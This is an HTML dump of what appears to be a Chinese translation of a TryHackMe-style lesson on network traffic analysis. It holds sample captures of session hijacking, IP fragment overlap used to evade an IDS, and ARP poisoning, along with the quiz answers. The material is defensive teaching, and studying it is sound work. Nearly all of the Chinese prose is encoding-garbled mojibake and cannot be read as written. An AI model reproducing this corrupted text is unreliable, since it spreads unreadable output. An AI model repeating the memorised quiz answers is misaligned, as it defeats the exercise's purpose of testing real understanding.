\"SSBsb3ZlIHlvdXIgY3VyaW91c2l0eQ==\"\n</code></pre>\n<h5 id=\"æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åˆ†æžç½‘ç»œæµé‡\">æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åˆ†æžç½‘ç»œæµé‡ï¼Ÿ</h5>\n<p>é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šåˆ©ç”¨ç½‘ç»œæµé‡åˆ†æžæ¥ï¼š</p>\n<ul>\n<li>ç›‘æŽ§ç½‘ç»œæ€§èƒ½</li>\n<li>æ£€æŸ¥ç½‘ç»œæ˜¯å¦å­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œä¾‹å¦‚ï¼šæ€§èƒ½çªç„¶é£™å‡ã€ç½‘ç»œé€Ÿåº¦å˜æ…¢ç­‰ã€‚</li>\n<li>æ£€æŸ¥å†…éƒ¨å’Œå¤–éƒ¨å¯ç–‘é€šä¿¡çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡DNSè¿›è¡Œæ•°æ®æ³„éœ²ã€é€šè¿‡HTTPä¸‹è½½æ¶æ„ ZIP æ–‡ä»¶ã€æ¨ªå‘ç§»åŠ¨ç­‰ã€‚</li>\n</ul>\n<p>ä»Žå®‰å…¨è¿è¥ä¸­å¿ƒï¼ˆSOCï¼‰çš„è§’åº¦æ¥çœ‹ï¼Œç½‘ç»œæµé‡åˆ†æžæœ‰åŠ©äºŽï¼š</p>\n<ul>\n<li>æ£€æµ‹å¯ç–‘æˆ–æ¶æ„æ´»åŠ¨</li>\n<li>äº‹ä»¶å“åº”æœŸé—´çš„æ”»å‡»é‡å»º</li>\n<li>éªŒè¯å’Œç¡®è®¤è­¦æŠ¥</li>\n</ul>\n<p>ä»¥ä¸‹ä¸¤ä¸ªåœºæ™¯è¿›ä¸€æ­¥è¯´æ˜Žäº†ç½‘ç»œæµé‡åˆ†æžçš„é‡è¦æ€§ï¼š</p>\n<ul>\n<li>æ ¹æ®ç»ˆç«¯ç”¨æˆ·ç³»ç»Ÿçš„æ—¥å¿—ï¼Œè¯¥ç³»ç»Ÿåœ¨ä¸–ç•Œåè°ƒæ—¶ä¸‹åˆ 4 ç‚¹å·¦å³å¼€å§‹å‡ºçŽ°å¼‚å¸¸è¡Œä¸ºã€‚é€šè¿‡åˆ†æžè¿›å‡ºè¯¥ç³»ç»Ÿçš„ç½‘ç»œæµé‡ï¼Œæˆ‘ä»¬å‘çŽ°äº†ä¸€ä¸ªå¯ç–‘çš„HTTPè¯·æ±‚ï¼Œå¹¶æˆåŠŸæå–å‡ºäº†ä¸€ä¸ªå¯ç–‘çš„ ZIP æ–‡ä»¶ã€‚</li>\n<li>æˆ‘ä»¬æ”¶åˆ°è­¦æŠ¥ï¼Œæ˜¾ç¤ºæŸä¸ªç»ˆç«¯ç”¨æˆ·ç³»ç»Ÿå‘é€çš„DNSè¯·æ±‚æ•°é‡è¿œè¶…ç½‘ç»œåŸºçº¿æ°´å¹³ã€‚ç»æ£€æŸ¥ï¼Œæˆ‘ä»¬å‘çŽ°æœ‰äººåˆ©ç”¨ä¸€ç§åä¸ºDNSéš§é“çš„æŠ€æœ¯çªƒå–æ•°æ®ã€‚</li>\n</ul>\n<p>æ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†<strong>ä¸ºä»€ä¹ˆ</strong>éœ€è¦ç½‘ç»œæµé‡åˆ†æžï¼ŒæŽ¥ä¸‹æ¥è®©æˆ‘ä»¬ç»§ç»­ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œçœ‹çœ‹æˆ‘ä»¬ç©¶ç«Ÿå¯ä»¥ç›‘æŽ§<strong>ä»€ä¹ˆ</strong>ã€‚</p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚<br />\né€šè¿‡ DNS èµ°ç§ C2 å‘½ä»¤çš„æŠ€æœ¯åç§°æ˜¯ä»€ä¹ˆï¼Ÿ</p>\n<pre><code class=\"language-python\">DNS Tunneling\n</code></pre>\n<h4 id=\"æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å“ªäº›ç½‘ç»œæµé‡\">æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å“ªäº›ç½‘ç»œæµé‡ï¼Ÿ</h4>\n<p>è¦å±•çŽ°æˆ‘ä»¬èƒ½å¤Ÿè§‚å¯Ÿåˆ°çš„ç½‘ç»œæµé‡ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å‡ ä¹Žæ‰€æœ‰å¸¦ç½‘ç»œæŽ¥å£çš„è®¾å¤‡éƒ½å®žçŽ°çš„æž¶æž„ï¼šTCP /IPåè®®æ ˆã€‚ä¸‹å›¾å±•ç¤ºäº†TCP /IPæ¨¡åž‹çš„ä¸åŒå±‚ã€‚æ¯ä¸€å±‚éƒ½æè¿°äº†å°†æ•°æ®ä¼ é€’åˆ°ä¸‹ä¸€å±‚æ‰€éœ€çš„ä¿¡æ¯ï¼ˆå¤´éƒ¨ï¼‰ã€‚æ¯ä¸ªå¤´éƒ¨ä¸­åŒ…å«çš„ä¿¡æ¯ï¼Œè¿žåŒåº”ç”¨ç¨‹åºæ•°æ®ï¼Œæ­£æ˜¯æˆ‘ä»¬æƒ³è¦è§‚å¯Ÿçš„å†…å®¹ã€‚æ—¥å¿—é€šå¸¸åŒ…å«è¿™äº›å¤´éƒ¨çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œä½†ä»ŽæœªåŒ…å«å®Œæ•´çš„åŒ…è¯¦ç»†ä¿¡æ¯ã€‚è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦è¿›è¡Œç½‘ç»œæµé‡åˆ†æžçš„åŽŸå› ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/9d8a1550a3c4ffb24ef6ce26c5b1b32b.png\" /></p>\n<p><strong>åº”ç”¨</strong><br />\nå±‚åŒ…å«ä¸¤ä¸ªé‡è¦çš„ä¿¡æ¯ç»“æž„ï¼šåº”ç”¨å¤´éƒ¨ä¿¡æ¯å’Œåº”ç”¨æ•°æ®æœ¬èº«ï¼ˆæœ‰æ•ˆè½½è·ï¼‰ã€‚è¿™äº›ä¿¡æ¯ä¼šæ ¹æ®æ‰€ä½¿ç”¨çš„åº”ç”¨å±‚åè®®è€Œå˜åŒ–ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªHTTPçš„ä¾‹å­ã€‚</p>\n<p>ä»¥ä¸‹ä»£ç ç‰‡æ®µå±•ç¤ºäº†å®¢æˆ·ç«¯å‘é€ GET è¯·æ±‚çš„åº”ç”¨ç¨‹åºæ ‡å¤´å’ŒæœåŠ¡å™¨çš„å“åº”ã€‚å¤§å¤šæ•° Web ä»£ç†å’Œé˜²ç«å¢™éƒ½ä¼šè®°å½•è¿™äº›æ ‡å¤´æ•°æ®ã€‚ä½†å®ƒä»¬ä¸ä¼šè®°å½•åº”ç”¨ç¨‹åºæ•°æ®æˆ–æœ‰æ•ˆè´Ÿè½½ã€‚ä»Ž GET è¯·æ±‚ä¸­ï¼Œæ‚¨å¯ä»¥ç¡®å®šå®¢æˆ·ç«¯æ­£åœ¨è¯·æ±‚ä¸€ä¸ªåä¸º <code>&lt;filename&gt;</code> çš„æ–‡ä»¶<code>suspicious_package.zip</code>ã€‚æœåŠ¡å™¨çš„å“åº”åŒ…å« 200 ä»£ç ï¼Œè¡¨ç¤ºè¯·æ±‚å·²è¢«æŽ¥å—ã€‚<br />\nä½†æ˜¯ï¼Œæ‚¨åœ¨æ—¥å¿—ä¸­çœ‹ä¸åˆ°çš„æ˜¯ ZIP æ–‡ä»¶çš„å†…å®¹ï¼ˆç”¨&lt;&lt;--ç¬¦å·æŒ‡å‡ºï¼‰ã€‚</p>\n<p><em>è¯·æ±‚</em></p>\n<pre><code class=\"language-json\">GET /downloads/suspicious_package.zip HTTP/1.1\nHost: www.tryhackrne.thn\nUser-Agent: curl/7.85.0\nAccept: */*\nConnection: close\n</code></pre>\n<p><em>å›žå¤</em></p>\n<pre><code class=\"language-json\">HTTP/1.1 200 OK\nDate: Mon, 29 Sep 2025 10:15:30 GMT\nServer: nginx/1.18.0\nContent-Type: application/zip\nContent-Length: 10485760\nContent-Disposition: attachment; filename=\"suspicious_package.zip\"\nLast-Modified: Mon, 29 Sep 2025 09:54:00 GMT\nETag: \"5d8c72-9f8a1c-3a2b4c\"\nAccept-Ranges: bytes\nConnection: close\n\n[binary ZIP file bytes follow â€” 10,485,760 bytes]  &lt;&lt;--\n</code></pre>\n<p><strong>ä¼ è¾“å±‚ï¼š</strong><br />\nåº”ç”¨å±‚çš„æ•°æ®å’Œå¤´éƒ¨ä¿¡æ¯ä¼šè¢«åˆ†å‰²å¹¶å°è£…æˆæ›´å°çš„ç‰‡æ®µã€‚æ¯ä¸ªç‰‡æ®µéƒ½åŒ…å«ä¸€ä¸ªä¼ è¾“å¤´éƒ¨ï¼Œé€šå¸¸æ˜¯ TCP æˆ– UDP åè®®ã€‚è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„é˜²ç«å¢™æ—¥å¿—æ¡ç›®ï¼š</p>\n<pre><code class=\"language-json\">2025-10-13 09:15:32 ACCEPT TCP src=192.168.1.45 dst=172.217.22.14 sport=51432 dport=443 flags=SYN len=60\n2025-10-13 09:15:32 ACCEPT TCP src=172.217.22.14 dst=192.168.1.45 sport=443 dport=51432 flags=SYN,ACK len=60\n</code></pre>\n<p>é˜²ç«å¢™æ—¥å¿—é€šå¸¸åŒ…å«æºç«¯å£ã€ç›®æ ‡ç«¯å£å’Œæ ‡å¿—ä½ï¼Œä½†å…¶ä»–å­—æ®µé€šå¸¸ä¸åŒ…å«åœ¨å†…ã€‚ç„¶è€Œï¼Œè¿™äº›å­—æ®µå¯¹äºŽæ£€æµ‹æŸäº›ç±»åž‹çš„æ”»å‡»ï¼ˆä¾‹å¦‚ä¼šè¯åŠ«æŒï¼‰éžå¸¸æœ‰ä»·å€¼ã€‚å¯ä»¥é€šè¿‡åˆ†æžæ•°æ®åŒ…å¤´éƒ¨ä¸­çš„<strong>åºåˆ—å·</strong>æ¥æ£€æµ‹<strong>ä¼šè¯åŠ«æŒ</strong>ã€‚å¦‚æžœåºåˆ—å·çªç„¶å‡ºçŽ°è¾ƒå¤§åå·®ï¼Œåˆ™éœ€è¦è¿›è¡Œè¿›ä¸€æ­¥è°ƒæŸ¥ã€‚ä»¥ä¸‹è¾“å‡ºæ˜¾ç¤ºäº†ä½¿ç”¨ Wireshark æ•èŽ·çš„ä¸€ç³»åˆ—æ•°æ®åŒ…ã€‚</p>\n<pre><code class=\"language-json\">No.     Time        Source          Destination     Protocol Length  Info\n1       0.000000    192.168.1.45    172.217.22.14   TCP      74      51432 â†’ 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460\n2       0.000120    172.217.22.14   192.168.1.45    TCP      74      80 â†’ 51432 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1460\n3       0.000220    192.168.1.45    172.217.22.14   TCP      66      51432 â†’ 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0\n4       0.010500    192.168.1.45    172.217.22.14   TCP      1514    51432 â†’ 80 [PSH, ACK] Seq=1 Ack=1 Win=64240 Len=1460\n5       0.010620    172.217.22.14   192.168.1.45    TCP      66      80 â†’ 51432 [ACK] Seq=1 Ack=1461 Win=65535 Len=0\n6       0.020100    192.168.99.200  172.217.22.14   TCP      74      51432 â†’ 80 [PSH, ACK] Seq=34567232&lt;&lt;--è¿™ä¸ª Ack=1 Win=64240 Len=20  \n</code></pre>\n<ul>\n<li>å‰ä¸‰è¡Œæ˜¾ç¤ºçš„æ˜¯æ­£å¸¸çš„TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚</li>\n<li>ç¬¬ 4 è¡Œå’Œç¬¬ 5 è¡Œæ˜¾ç¤ºåˆæ³•æ•°æ®ä¼ è¾“ã€‚</li>\n<li>ç¬¬ 6 è¡Œæ˜¾ç¤ºæ¥è‡ªå…¶ä»–æºçš„æ•°æ®åŒ…è¯•å›¾å°†è‡ªèº«æ³¨å…¥ä¼šè¯ã€‚è¯·æ³¨æ„åºåˆ—å·çš„å¤§å¹…è·³è·ƒã€‚</li>\n</ul>\n<p><strong>åœ¨äº’è”ç½‘ä¼ è¾“è¿‡ç¨‹</strong>ä¸­ï¼Œå½“ä¼ è¾“å±‚å‘é€ä¸€ä¸ªæ•°æ®æ®µæ—¶ï¼Œç½‘ç»œå±‚ä¹Ÿä¼šæ·»åŠ å…¶å¤´éƒ¨ã€‚å¦‚æžœæ•°æ®æ®µå¤§äºŽæœ€å¤§ä¼ è¾“å•å…ƒ (MTU)ï¼Œåˆ™ä¼šè¢«åˆ†å‰²æˆå¤šä¸ªåˆ†ç‰‡ï¼Œå¹¶ä¸ºæ¯ä¸ªåˆ†ç‰‡æ·»åŠ å¤´éƒ¨ã€‚æœ€å¸¸è®°å½•çš„å­—æ®µæ˜¯æº IP åœ°å€ã€ç›®æ ‡ IP åœ°å€å’Œç”Ÿå­˜æ—¶é—´ (TTL)ã€‚è¿™å¯¹äºŽå¤§å¤šæ•°åº”ç”¨åœºæ™¯æ¥è¯´å·²ç»è¶³å¤Ÿã€‚ä½†æ˜¯ï¼Œå¦‚æžœæˆ‘ä»¬æƒ³è¦æ£€æµ‹åˆ†ç‰‡æ”»å‡»ï¼Œä¾‹å¦‚ï¼Œè¿˜éœ€è¦æ£€æŸ¥åˆ†ç‰‡åç§»é‡å’Œæ€»é•¿åº¦å­—æ®µã€‚åˆ†ç‰‡æ”»å‡»æœ‰å¤šç§å˜ä½“ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºæžå°çš„åˆ†ç‰‡æ¥ç»•è¿‡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)ï¼Œæˆ–è€…é€šè¿‡ä½¿ç”¨é‡å çš„å­—èŠ‚èŒƒå›´æ¥å¹²æ‰°åˆ†ç‰‡çš„é‡ç»„ã€‚ä¸‹é¢çš„ç¤ºä¾‹å±•ç¤ºäº†é‡å çš„å­—èŠ‚èŒƒå›´ã€‚ç¬¬ 3 è¡Œçš„åç§»é‡ä¸Žç¬¬ 2 è¡Œçš„åç§»é‡Offseté‡å ã€‚è¿™æ„å‘³ç€æ•´ä¸ªæ•°æ®åŒ…å¯ä»¥é€šè¿‡æŸç§æ–¹å¼é‡ç»„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æŠ€æœ¯æ¥ç»•è¿‡ IDSã€‚</p>\n<pre><code class=\"language-json\">No.   Time       Source        Destination   Protocol Length Info\n1     0.000000   203.0.113.45  192.168.1.10  UDP      1514    Fragmented IP protocol (UDP) (id=0x1a2b) [MF] Offset=0, Len=1480\n2     0.000015   203.0.113.45  192.168.1.10  UDP      1514    Fragmented IP protocol (UDP) (id=0x1a2b) [MF] Offset=1480, Len=1480\n3     0.000030   203.0.113.45  192.168.1.10  UDP       600    Fragmented IP protocol (UDP) (id=0x1a2b) Offset=1480, Len=64   &lt;-- Overlap\n4     0.000045   192.168.1.10  203.0.113.45  ICMP      98     Destination unreachable (Fragment reassembly time exceeded)\n</code></pre>\n<p><strong>é“¾è·¯</strong><br />\nå±‚å®Œæˆå°è£…åŽï¼ŒIP æ•°æ®åŒ…ä¼šè¢«å‘é€åˆ°é“¾è·¯å±‚ã€‚é“¾è·¯å±‚ä¹Ÿä¼šæ·»åŠ è‡ªå·±çš„å¤´éƒ¨ï¼Œå…¶ä¸­åŒ…å«æ›´å¤šå¯»å€ä¿¡æ¯ã€‚å¤§å¤šæ•°æ—¥å¿—ä¼šæ˜¾ç¤ºæº MAC åœ°å€å’Œç›®æ ‡ MAC åœ°å€ã€‚ä½†å¯¹äºŽæŸäº›ç±»åž‹çš„æ”»å‡»ï¼Œä¾‹å¦‚ ARP æ¬ºéª—æˆ–æŠ•æ¯’æ”»å‡»ï¼Œæ—¥å¿—ä¸­çš„ä¿¡æ¯å¯èƒ½ä¸è¶³ä»¥åº”å¯¹ã€‚å¯¹äºŽè¿™ç±»æ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦å®Œæ•´çš„æ•°æ®åŒ…åŠå…¶ä¸Šä¸‹æ–‡ã€‚ä¾‹å¦‚ï¼Œæ—¥å¿—æ— æ³•æ˜¾ç¤º MAC åœ°å€æ˜¯å¦å‡ºçŽ°åœ¨å¤šä¸ªæŽ¥å£ä¸Šï¼Œæˆ–è€…æ˜¯å¦å‘é€äº†è®¸å¤š MAC åœ°å€å†²çªçš„å…è´¹ ARP æ•°æ®åŒ…ã€‚ä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºäº†ä¸€ä¸ª ARP æŠ•æ¯’æ”»å‡»çš„æ•°æ®åŒ…æ•èŽ·ã€‚IP åœ°å€ä¸º 192.168.1.200 çš„ä¸»æœºä½¿ç”¨ç›¸åŒçš„ MAC åœ°å€å›žå¤æ¯ä¸ª ARP è¯·æ±‚ã€‚</p>\n<pre><code class=\"language-json\">No.   Time       Source           Destination      Protocol Length Info\n1     0.000000   192.168.1.1      Broadcast        ARP      60     Who has 192.168.1.10? Tell 192.168.1.1\n2     0.000025   192.168.1.10     192.168.1.1      ARP      60     192.168.1.10 is at 00:11:22:33:44:55\n3     1.002010   192.168.1.200    192.168.1.1      ARP      60     192.168.1.10 is at aa:bb:cc:dd:ee:ff  &lt;-- Attacker spoof\n4     1.002015   192.168.1.200    192.168.1.10     ARP      60     192.168.1.1 is at aa:bb:cc:dd:ee:ff  &lt;-- Attacker spoof\n5     1.100000   192.168.1.10     172.217.22.14    TCP      74     54433 â†’ 80 [SYN] Seq=0 Win=64240 Len=0\n6     1.100120   192.168.1.200    172.217.22.14    TCP      74     54433 â†’ 80 [SYN] Seq=0 Win=64240 Len=0  &lt;-- Relayed via attacker\n</code></pre>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>è¯·æŸ¥çœ‹ä»»åŠ¡ä¸­çš„ HTTP ç¤ºä¾‹ï¼Œå¹¶å›žç­”ä»¥ä¸‹é—®é¢˜ï¼šHTTP å“åº”ä¸­åŒ…å«çš„ ZIP é™„ä»¶çš„å¤§å°æ˜¯å¤šå°‘ï¼Ÿè¯·ä»¥å­—èŠ‚ä¸ºå•ä½è®°ä¸‹ç­”æ¡ˆã€‚</p>\n<pre><code class=\"language-python\">10485760\n</code></pre>\n<p>æ”»å‡»è€…ä½¿ç”¨å“ªç§æ”»å‡»æ–¹å¼æ¥è¯•å›¾ç»•è¿‡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)ï¼Ÿ</p>\n<pre><code class=\"language-python\">fragmentation\n</code></pre>\n<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ TCP æŠ¥å¤´ä¸­çš„å“ªä¸ªå­—æ®µæ¥æ£€æµ‹ä¼šè¯åŠ«æŒï¼Ÿ</p>\n<pre><code class=\"language-python\">sequence number\n</code></pre>\n<h4 id=\"ç½‘ç»œæµé‡æ¥æºå’Œæµå‘\">ç½‘ç»œæµé‡æ¥æºå’Œæµå‘</h4>\n<p>åœ¨ä¹‹å‰çš„ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†åŸºäºŽTCP /IP åè®®æ ˆçš„ç†è®ºè§‚å¯Ÿç»“æžœã€‚å®žé™…ä¸Šï¼Œå…³æ³¨å…·ä½“çš„æºå’Œæµæ›´æœ‰å¸®åŠ©ã€‚ä¼ä¸šç½‘ç»œé€šå¸¸æœ‰ä¸€äº›é¢„å…ˆç¡®å®šçš„ç½‘ç»œæµå’Œæºã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™äº›æºåˆ†ä¸ºä¸¤ç±»ï¼š</p>\n<ul>\n<li>ä¸­ä»‹</li>\n<li>ç«¯ç‚¹</li>\n</ul>\n<p>æˆ‘ä»¬è¿˜å¯ä»¥å°†è¿™äº›æµé‡åˆ†ä¸ºä¸¤ç±»ï¼š</p>\n<ul>\n<li>å—åŒ—å‘ï¼šè¿›å‡ºå±€åŸŸç½‘å¹¶ç»è¿‡é˜²ç«å¢™çš„æµé‡</li>\n<li>ä¸œè¥¿å‘ï¼šæŒ‡å±€åŸŸç½‘å†…çš„æµé‡ï¼ˆåŒ…æ‹¬å»¶ä¼¸åˆ°äº‘ç«¯çš„å±€åŸŸç½‘æµé‡ï¼‰ã€‚</li>\n</ul>\n<p>ä¸‹é¢æˆ‘ä»¬é€ä¸€æŽ¢è®¨å®ƒä»¬ã€‚</p>\n<h5 id=\"æ¥æº\">æ¥æº</h5>\n<p>å¦‚å‰æ‰€è¿°ï¼Œç½‘ç»œæµé‡æ¥æºæœ‰ä¸¤ç§ï¼šç»ˆç«¯è®¾å¤‡å’Œä¸­é—´è®¾å¤‡ã€‚è¿™äº›è®¾å¤‡æ—¢å­˜åœ¨äºŽå±€åŸŸç½‘ (LAN) ä¸­ï¼Œä¹Ÿå­˜åœ¨äºŽå¹¿åŸŸç½‘ (WAN) ä¸­ã€‚</p>\n<p><strong>ä¸­é—´æºï¼š</strong><br />\nè¿™äº›è®¾å¤‡æ˜¯æµé‡çš„ä¸»è¦é€šé“ã€‚è™½ç„¶å®ƒä»¬ä¹Ÿä¼šäº§ç”Ÿä¸€äº›æµé‡ï¼Œä½†è¿œä½ŽäºŽç»ˆç«¯è®¾å¤‡äº§ç”Ÿçš„æµé‡ã€‚æ­¤ç±»è®¾å¤‡åŒ…æ‹¬é˜²ç«å¢™ã€äº¤æ¢æœºã€Webä»£ç†ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ(IDS)ã€å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ(IPS)ã€è·¯ç”±å™¨ã€æŽ¥å…¥ç‚¹ã€æ— çº¿å±€åŸŸç½‘æŽ§åˆ¶å™¨ç­‰ç­‰ã€‚æˆ–è®¸ä¸Žæˆ‘ä»¬å…³ç³»ä¸å¤§ï¼Œä½†äº’è”ç½‘æœåŠ¡æä¾›å•†çš„æ‰€æœ‰åŸºç¡€è®¾æ–½ä¹Ÿå±žäºŽæ­¤ç±»ã€‚</p>\n<p>è¿™äº›è®¾å¤‡äº§ç”Ÿçš„æµé‡æ¥è‡ªè·¯ç”±åè®®ï¼ˆEIGRPã€OSPFã€BGPï¼‰ã€ç®¡ç†åè®®ï¼ˆSNMPã€PINGï¼‰ã€æ—¥å¿—åè®®ï¼ˆSYSLOGï¼‰å’Œå…¶ä»–æ”¯æŒåè®®ï¼ˆARPã€STPã€DHCPï¼‰ç­‰æœåŠ¡ã€‚</p>\n<p><strong>ç»ˆç«¯æºï¼š</strong><br />\nè¿™äº›æ˜¯æµé‡çš„èµ·å§‹ç‚¹å’Œç»ˆç‚¹ã€‚ç»ˆç«¯è®¾å¤‡å ç”¨å¤§éƒ¨åˆ†ç½‘ç»œå¸¦å®½ã€‚å±žäºŽè¿™ä¸€ç±»åˆ«çš„è®¾å¤‡åŒ…æ‹¬æœåŠ¡å™¨ã€ä¸»æœºã€ç‰©è”ç½‘è®¾å¤‡ã€æ‰“å°æœºã€è™šæ‹Ÿæœºã€äº‘èµ„æºã€ç§»åŠ¨ç”µè¯ã€å¹³æ¿ç”µè„‘ç­‰ç­‰ã€‚</p>\n<h5 id=\"æµé‡\">æµé‡</h5>\n<p>ç½‘ç»œæµé‡é€šå¸¸å–å†³äºŽç½‘ç»œä¸­å¯ç”¨çš„æœåŠ¡ï¼Œä¾‹å¦‚ Active Directoryã€SMBã€HTTPS ç­‰ã€‚åœ¨å…¸åž‹çš„ä¼ä¸šç½‘ç»œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›æµé‡åˆ†ä¸ºå—åŒ—å‘æµé‡å’Œä¸œè¥¿å‘æµé‡ã€‚</p>\n<p><strong>å—åŒ—å‘æµé‡</strong><br />\nï¼ˆNSæµé‡ï¼‰é€šå¸¸åœ¨å±€åŸŸç½‘ï¼ˆLANï¼‰å’Œå¹¿åŸŸç½‘ï¼ˆWANï¼‰ä¹‹é—´åŒå‘æµåŠ¨æ—¶å—åˆ°å¯†åˆ‡ç›‘æŽ§ã€‚æ­¤ç±»æµé‡ä¸­æœ€å¸¸è§çš„æ˜¯å®¢æˆ·ç«¯-æœåŠ¡å™¨åè®®ï¼Œä¾‹å¦‚HTTPSã€DNSã€SSHã€VPNã€SMTPã€RDPç­‰ç­‰ã€‚æ¯ç§åè®®éƒ½æœ‰ä¸¤ä¸ªæµï¼šå…¥ç«™ï¼ˆingressï¼‰å’Œå‡ºç«™ï¼ˆegressï¼‰ã€‚æ‰€æœ‰è¿™äº›æµé‡éƒ½ä¼šä»¥æŸç§æ–¹å¼ç»è¿‡é˜²ç«å¢™ã€‚æ­£ç¡®é…ç½®é˜²ç«å¢™è§„åˆ™å’Œæ—¥å¿—è®°å½•æ˜¯å®žçŽ°æµé‡å¯è§æ€§çš„å…³é”®ã€‚</p>\n<p><strong>ä¸œè¥¿å‘æµé‡</strong><br />\nï¼ˆEWæµé‡ï¼‰é€šå¸¸åªåœ¨ä¼ä¸šå±€åŸŸç½‘å†…ä¼ è¾“ï¼Œå› æ­¤ç›‘æŽ§è¾ƒå°‘ã€‚ç„¶è€Œï¼Œè·Ÿè¸ªè¿™äº›æµé‡è‡³å…³é‡è¦ã€‚å½“ç½‘ç»œé­åˆ°å…¥ä¾µæ—¶ï¼Œæ”»å‡»è€…å¾€å¾€ä¼šåˆ©ç”¨å†…éƒ¨ä¸åŒçš„æœåŠ¡åœ¨ç½‘ç»œä¸­æ¨ªå‘ç§»åŠ¨ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œæ­¤ç±»æœåŠ¡ç§ç±»ç¹å¤šã€‚ç‚¹å‡»æ¯ä¸ªç±»åˆ«å³å¯æŸ¥çœ‹å…¶åŒ…å«çš„æœåŠ¡ã€‚</p>\n<p>ç›®å½•ã€èº«ä»½éªŒè¯å’Œèº«ä»½æœåŠ¡</p>\n<ul>\n<li>Kerberos /LDAPï¼šèº«ä»½éªŒè¯/å¯¹ Active Directory çš„æŸ¥è¯¢</li>\n<li>RADIUS/TACACS+ï¼šç½‘ç»œè®¿é—®æŽ§åˆ¶</li>\n<li>è¯ä¹¦é¢å‘æœºæž„é¢å‘å†…éƒ¨è¯ä¹¦</li>\n</ul>\n<p>æ–‡ä»¶å…±äº«å’Œæ‰“å°æœåŠ¡</p>\n<ul>\n<li>SMB /CIFSï¼šè®¿é—®ç½‘ç»œé©±åŠ¨å™¨</li>\n<li>IPP/LPDï¼šç½‘ç»œæ‰“å°</li>\n</ul>\n<p>è·¯ç”±å™¨ã€äº¤æ¢æœºå’ŒåŸºç¡€è®¾æ–½æœåŠ¡</p>\n<ul>\n<li>ä¸»æœºä¸ŽDHCPæœåŠ¡å™¨ä¹‹é—´çš„DHCPé€šä¿¡</li>\n<li>ARPå¹¿æ’­æ¶ˆæ¯</li>\n<li>å†…éƒ¨DNS</li>\n<li>è·¯ç”±åè®®æ¶ˆæ¯</li>\n</ul>\n<p>åº”ç”¨é€šä¿¡</p>\n<ul>\n<li>æ•°æ®åº“è¿žæŽ¥ï¼šåŸºäºŽTCP çš„SQL</li>\n<li>å¾®æœåŠ¡ APIï¼šæœåŠ¡ä¹‹é—´çš„RESTæˆ– gRPC è°ƒç”¨</li>\n</ul>\n<p>å¤‡ä»½ä¸Žå¤åˆ¶</p>\n<ul>\n<li>æ–‡ä»¶å¤åˆ¶ï¼šåœ¨æ•°æ®ä¸­å¿ƒä¹‹é—´æˆ–å¤åˆ¶åˆ°å¤‡ä»½æœåŠ¡å™¨</li>\n<li>æ•°æ®åº“å¤åˆ¶ï¼šMySQL äºŒè¿›åˆ¶æ—¥å¿—å¤åˆ¶ã€PostgreSQL æµå¼å¤åˆ¶ç­‰ç­‰</li>\n</ul>\n<p>ç›‘æŽ§ä¸Žç®¡ç†</p>\n<ul>\n<li>SNMPï¼šè®¾å¤‡å¥åº·æŒ‡æ ‡</li>\n<li>ç³»ç»Ÿæ—¥å¿—ï¼šé›†ä¸­å¼æ—¥å¿—è®°å½•</li>\n<li>NetFlow / IPFIXï¼šæµé‡é¥æµ‹</li>\n<li>å…¶ä»–ç«¯ç‚¹æ—¥å¿—ä¼šå‘é€åˆ°ä¸­å¤®æ—¥å¿—æœåŠ¡å™¨</li>\n</ul>\n<h5 id=\"æµç¨‹ç¤ºä¾‹\">æµç¨‹ç¤ºä¾‹</h5>\n<p>è®©æˆ‘ä»¬é€šè¿‡å¯è§†åŒ–çš„æ–¹å¼æ¥çœ‹ä¸€ä¸‹ä¸Šé¢æåˆ°çš„ä¸€äº›ç½‘ç»œæµé‡ã€‚</p>\n<p><strong>HTTPS</strong><br />\næœ‰å¤šç§ä¸åŒçš„ç½‘ç»œæµé‡æµã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ª Webä»£ç†æ‰§è¡ŒTLSæ£€æŸ¥çš„æµï¼š<br />\nä¸»æœºè¯·æ±‚è®¿é—®æŸä¸ªç½‘ç«™ï¼›è¯¥è¯·æ±‚è¢«å‘é€åˆ°ä¸‹ä¸€ä»£é˜²ç«å¢™ (NGFW)ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª Webä»£ç†ã€‚Webä»£ç†å……å½“ Web æœåŠ¡å™¨ï¼ŒåŒæ—¶ä¸Žå®žé™…çš„ Web 